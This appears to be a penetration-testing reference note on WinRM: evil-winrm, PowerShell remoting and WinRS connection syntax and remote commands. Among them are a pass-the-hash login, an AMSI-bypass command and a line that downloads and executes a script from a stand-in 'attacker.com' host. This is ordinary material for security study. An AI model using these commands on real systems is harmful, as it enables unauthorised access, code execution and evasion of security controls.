---
id: Usage
aliases: []
tags:
  - Networking/Services/WinRM/Usage
---

# Usage

<!-- Connect {{{-->
## Connect

<!-- Evil-WinRM {{{-->
### Evil-WinRM

Basic connection

```sh
evil-winrm -i $target -u administrator -p '<password>'
```

With domain

```sh
evil-winrm -i $target -u 'DOMAIN\<user>' -p '<password>'
```

Using hash (*Pass-the-Hash*)

```sh
evil-winrm -i $target -u administrator -H 'NTHASH'
```

Using SSL (*port `5986`*)

```sh
evil-winrm -i $target -u administrator -p '<password>' -S
```

With custom port

```sh
evil-winrm -i $target -u administrator -p '<password>' -P 5985
```

<!-- }}} -->

<!-- PowerShell {{{-->
### PowerShell

Create credentials

```sh
$password = ConvertTo-SecureString "<password>" -AsPlainText -Force
```

```sh
$cred = New-Object System.Management.Automation.PSCredential("administrator", $password)
```

Connect interactively

```sh
Enter-PSSession -ComputerName $target -Credential $cred
```

Run command remotely

```sh
Invoke-Command -ComputerName $target -Credential $cred -ScriptBlock { whoami }
```

Connect to multiple machines

```sh
$computers = "server1", "server2", "server3"
```

```sh
Invoke-Command -ComputerName $computers -Credential $cred -ScriptBlock { hostname }
```

<!-- }}} -->

<!-- WinRS {{{-->
### WinRS

Execute single command

```sh
winrs -r:http://$target:5985 -u:administrator -p:<password> "whoami"
```

Interactive shell

```sh
winrs -r:http://$target:5985 -u:administrator -p:<password> cmd
```

With domain

```sh
winrs -r:http://$target:5985 -u:DOMAIN\<username> -p:<password> cmd
```

<!-- }}} -->

<!-- Ruby WinRM {{{-->
### Ruby WinRM

Connect using Ruby [WinRM](https://github.com/WinRb/WinRM) library

> [!example]-
>
> ```sh
> require 'winrm'
>
> conn = WinRM::Connection.new(
>   endpoint: 'http://target.com:5985/wsman',
>   user: 'administrator',
>   password: 'password'
> )
>
> conn.shell(:powershell) do |shell|
>   output = shell.run('Get-Process') do |stdout, stderr|
>     STDOUT.print stdout
>     STDERR.print stderr
>   end
> end
> ```

<!-- }}} -->

___
<!-- }}} -->

<!-- Commands {{{-->
## Commands

Execute commands remotely through WinRM

Basic command execution

> [!example]-
>
> ```sh
> Invoke-Command -ComputerName $target -ScriptBlock { whoami }
> ```

Multiple commands

> [!example]-
>
> ```sh
> Invoke-Command -ComputerName $target -ScriptBlock {
>   whoami
>   hostname
>   ipconfig
> }
> ```

Execute local script on remote

> [!example]-
>
> ```sh
> Invoke-Command -ComputerName $target -FilePath .\script.ps1
> ```

Download and execute

> [!example]-
>
> ```sh
> Invoke-Command -ComputerName $target -ScriptBlock {
>   IEX(New-Object Net.WebClient).DownloadString('http://<attacker.com>/script.ps1')
> }
> ```

<!-- evil-winrm {{{-->
### evil-winrm

[evil-winrm](https://github.com/Hackplayers/evil-winrm) commands

> [!example]-
>
> | Command | Description | Usage |
> | --- | --- | --- |
> | `upload` | Upload file to target | upload /local/file.exe C:\Windows\Temp\file.exe |
> | `download` | Download file from target | download C:\file.txt /tmp/file.txt |
> | `services` | List services | services |
> | `menu` | Show available commands | menu |
> | `Bypass-4MSI` | Bypass AMSI | Bypass-4MSI |
> | `Invoke-Binary` | Execute binary from memory | Invoke-Binary /path/to/binary.exe |

<!-- }}} -->

<!-- PowerShell {{{-->
### PowerShell

PowerShell remoting cmdlets

> [!example]-
>
> | Cmdlet | Description | Example |
> | --- | --- | --- |
> | `Enter-PSSession` | Interactive remote session | `Enter-PSSession -ComputerName target` |
> | `Exit-PSSession` | Exit remote session | `Exit-PSSession` |
> | `Invoke-Command` | Run command remotely | `Invoke-Command -ComputerName target -ScriptBlock <cmd>` |
> | `New-PSSession` | Create persistent session | `$s = New-PSSession -ComputerName target` |
> | `Remove-PSSession` | Close session | `Remove-PSSession -Session $s` |
> | `Get-PSSession` | List active sessions | `Get-PSSession` |

<!-- }}} -->

___
<!-- }}} -->
